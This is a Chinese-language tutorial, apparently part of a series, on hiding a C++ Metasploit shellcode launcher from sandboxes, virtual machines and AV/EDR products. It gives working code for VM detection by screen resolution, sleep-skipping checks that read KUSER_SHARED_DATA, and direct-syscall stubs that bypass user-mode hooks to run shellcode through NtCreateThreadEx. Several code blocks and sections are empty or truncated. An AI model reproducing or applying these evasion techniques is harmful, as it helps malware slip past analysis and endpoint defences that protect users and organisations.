在第一篇文章中，我们用C ++创建了基本的Metasploit shellcode启动器，演示了如何降低已编译的可执行文件的检测率——利用有效载荷编码/加密，使用自定义代码签名证书进行二进制签名，切换到x64体系结构。

**恶意软件的动态分析**

  

  

可执行文件的动态分析可以由沙盒自动执行，也可以由分析师手动执行。恶意应用程序通常使用各种方法来对其执行环境进行指纹识别，并根据情况执行不同的操作。

  

自动化分析是在简化的沙盒环境中执行的，该环境可能具有某些特定特征，尤其是它可能无法模拟真实环境的所有细微差别。手动分析通常在虚拟环境中执行，并且可能会遇到特定的其他工具（如调试器，其他分析软件）。

  

自动分析和手动分析都具有共同的特征，特别是在虚拟化环境中执行，如果配置不正确，则很容易被检测到。大多数沙盒/分析检测技术都围绕检查特定的环境属性（有限的资源，指示性的设备名称）和artifacts（特定的文件存在，注册表项）。

  

但是，有几种特定的检测方法可用于自动沙箱，而针对恶意软件分析人员所使用的虚拟环境则有其他检测方法。

**检测虚拟化环境**

  

  

沙盒和分析人员的虚拟化操作系统通常都不能100％准确地模拟实际的执行环境（例如常见的用户工作站）。虚拟化环境的资源有限（相应的设备名称也可以提供有用的信息），它可能安装了VM特定工具和驱动程序，通常看起来像是安装了全新的Windows，它有时还会用硬编码的用户名或计算机名。这一点可以加以利用。

  

  

  

**硬件资源**

**VM专用artifacts**

**文件，目录，进程和窗口名称**

  

  

这些方法通常可用于检测沙盒，虚拟机，调试器或手动分析环境。有特定的应用程序（以及关联的进程和窗口名称盒已加载的库），普通用户不能使用。

  

**1\. 应用程序名称和目录**

在沙盒中分析的二进制文件的名称有时会更改为通用名称，例如sample.exe。恶意软件分析人员也可能在执行文件之前重命名该文件。我们可以检查文件或目录名称是否包含“可疑”字符串。但是，当我们确定可执行文件的名称和路径时（例如，当VBA宏代码将其删除时），我们可以验证它是否确实从假定的位置执行：

*

**屏幕分辨率**

  

  

虚拟化环境基本不会同时用多个监视器（尤其是沙盒）。虚拟显示器可能会有不常见的屏幕尺寸（尤其是在安装到主机屏幕但不处于全屏模式时-注意带有条形和选项卡的虚拟机监控程序窗口）。

  

以下的代码示例有点复杂。首先，检查主显示器是否具有低分辨率。检查发现没问题后，枚举所有显示器。EnumDisplayMonitors函数需要一个用户定义的回调函数，该函数将为枚举的每个监视器提供句柄作为参数提供。定义该回调来检查每个监视器的分辨率（是否为标准分辨率），并将结果提供给公共变量。如果某个监视器的宽度或高度都不正常，应用程序会判定它是在虚拟环境中执行的。

*   
*   
*   
*   
*   
*   
*   
*

*   
*   
*

```
bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data){  MONITORINFO monitorInfo;  monitorInfo.cbSize = sizeof(MONITORINFO);  GetMonitorInfoW(hMonitor, &monitorInfo);  int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;  int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;  if (xResolution < 0) xResolution = -xResolution;  if (yResolution < 0) yResolution = -yResolution;  if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)    || (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))  {    *((BOOL*)data) = true;  }  return true;}
```

**延迟执行**

  

  

延迟执行可能会为了规避沙盒分析而超出样本执行的时间限制。但这不像Sleep(1000000)那样容易。沙箱可以快速推进我们的“小睡”。

  

我们需要检查睡眠前后的系统正常运行时间。用较低级别的userland API进入睡眠模式（这样被AV钩住的几率要低一些）。这需要以动态形式获取函数地址-下一篇文章的API调用混淆会经常用到它。此外，NtDelayExecution函数需要的睡眠时间参数格式与Sleep以下格式不同：

  

*   
*   
*   
*   
*   
*   
*   
*   


**内核用户共享数据**

  

某些复杂的沙盒可能会同时钩住两个Sleep功能（甚至是内核模式ZwDelayExecution；但内核钩需要管理程序级别的访问）和GetTickCount64（或内核模式KeQueryTickCount）。我们可以使用KUSER\_SHARED\_DATA系统内核以用户模式（只读模式）共享的结构，其中包含有关“KSYSTEM\_TIME 结构”的信息。这种结构一直位于内存（0x7ffe0000）中的同一地址。实际的系统正常运行时间（KSYSTEM\_TIME结构）存储在偏移量0x320中。我们可以从系统的内存中读取它，用来检查与KSYSTEM\_TIME 结构相关的函数是否被沙盒操纵：

  

*   
*   
*   
*   
*   
*   
*   
*   

```
Sleep(1000000);ULONG *PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;LONG *PUserSharedData_High1Time = (PLONG)0x7ffe0324;ULONG *PUserSharedData_LowPart = (PULONG)0x7ffe0320;DWORD time = GetTickCount64();DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +  ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);if ((time - kernelTime) > 100 && (kernelTime - time) > 100) return false;
```

  

  

  

**函数挂钩**

  

  

AV / EDR /沙盒可以挂钩特定函数（通常用于恶意目的，例如，NtCreateThreadEx用于代码注入，NtReadVirtualMemory用于内存读取，尤其是在使用lsass.exe转储来提取证书凭据时）。当某个函数被钩住时，通常会跳转到外部库中的另一个函数来覆盖其第一条指令，发现恶意活动，阻止其进一步执行。让我们看看如何检测和修复函数挂钩。

  

**1\. 检查和解钩函数**

  

检查函数汇编字节，查看是否有任何挂钩的迹象（例如call指令或push和ret指令的组合）。我们还可以将内存中加载的函数指令与磁盘上的.dll内容进行比较。那么如何在ntdll.dll中检查NtCreateThreadEx函数是否有挂钩现象呢？首先，从磁盘打开库文件，并将其映射到内存。然后，浏览标题，找到导出目录的相对位置。接下来，遍历存储在AddressOfNames数组中的函数名称，查找“ NtCreateThreadEx”名称（要找到实际的函数代码位置，我们需要浏览AddressOfNameOrdinals数组）。

*   
*   
*

*

**2\. 直接系统调用**

  

绕过用户模式API挂钩，需要用到直接系统调用。我们先用Process Monitor分析恶意软件。

  

回顾：可执行文件注入shellcode，创建新的线程来运行它：

  

*   

```

```

  

捕获线程创建事件：

从代码中调用的CreateThread函数导致NtCreateThreadEx的调用。然后，把syscall ID存储在EAX寄存器中，用syscall CPU指令把执行切换到内核模式（0环）。

  

![](../Images/dec33939dd20d05ec4e28eb8aeb0d5a6.png)

  

如果NtCreateThreadEx函数被钩住，那么在调用此函数或其他更高级别的函数（如CreateThreadetc）时，可能无法达成syscall 。但我们可以直接从代码里生成syscall来绕过钩子-这就要把所有的函数参数推到堆栈（可以在C中完成），发出syscall（带有汇编代码）。

  

首先，我们需要定义汇编代码里的NtCreateThreadExin，把.asm文件添加到项目中。还要确保Microsoft Macro Assembler文件包含在项目的“ Build Customizations”选项中。

  

*   
*   
*   
*   
*   
*   
*   
*   

```
.code  NtCreateThreadEx PROC    mov r10, rcx    mov eax, 00bdh    syscall    ret  NtCreateThreadEx ENDPEnd
```

  

然后在源代码中声明外部方法：

  

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
EXTERN_C NTSTATUS(NTAPI NtCreateThreadEx)(  OUT PHANDLE hThread,  IN ACCESS_MASK DesiredAccess,  IN PVOID ObjectAttributes,  IN HANDLE ProcessHandle,  IN PTHREAD_START_ROUTINE lpStartAddress,  IN PVOID lpParameter,  IN ULONG Flags,  IN SIZE_T StackZeroBits,  IN SIZE_T SizeOfStackCommit,  IN SIZE_T SizeOfStackReserve,  OUT PVOID AttributeList);
```

  

最后要做的是调用该函数：

  

*   
*   
*   
*   

```
HANDLE hThread;HANDLE hProcess = GetCurrentProcess();NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, FALSE, NULL, NULL, NULL, NULL);WaitForSingleObject(hThread, INFINITE);
```

  

这样，我们就绕开了用户模式WinAPI线程创建函数上的所有钩子。但我们已经硬编码了特定版本的syscall ID（0xBD）。为了支持不同的Windows版本，我们要有全部syscalls ID，以动态方式检查系统版本。这时，SysWhispers工具就能派上用场了。我们可以用这个工具在C和OS版本检查中生成必要的函数和类型定义，在汇编中生成syscall定义。
